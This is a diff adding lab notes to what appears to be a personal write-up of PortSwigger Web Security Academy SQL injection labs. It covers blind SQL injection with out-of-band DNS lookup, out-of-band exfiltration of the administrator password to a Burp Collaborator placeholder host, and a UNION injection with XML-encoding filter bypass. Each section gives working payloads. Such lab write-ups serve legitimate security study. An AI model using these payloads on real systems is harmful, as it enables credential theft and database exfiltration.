@@ -321,3 +321,50 @@ Password enumeration
 ```
 
 ## **15. Blind SQL injection with out-of-band interaction**
+
+This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+- Vulnerable parameter: tracking cookie
+- End goal: SQLi and cause a DNS lookup
+
+![[Pasted image 20240918095729.png]]
+- Payload to be inserted into Cookie: Tracking Id parameter (also it could be encoded in HTML format when inserted into burp):
+`' | | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
+![[Pasted image 20240918095940.png]]
+![[Pasted image 20240918100131.png]]
+
+
+## **16. Blind SQL injection with out-of-band data exfiltration**
+
+This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+
+
+Same as previous example but this time we will concatenate['| | (subquery) ' | |]subquery on our burp collaborator server which is a select statement that will extract `password` from `users` where `username` is administrator:
+`' | | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --`
+
+![[Pasted image 20240918102633.png]]
+
+## **17**. **Lab: SQL injection with filter bypass via XML encoding**
+
+This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
+
+![[Pasted image 20240918100813.png]]
+![[Pasted image 20240918100905.png]]
+
+![[Pasted image 20240918100602.png]]
+![[Pasted image 20240918100938.png]]
+
+- Payload to insert into burp hex encoded:
+  `1 UNION SELECT username | |  '~'   | | password FROM users`
+  ![[Pasted image 20240918101148.png]]
+  
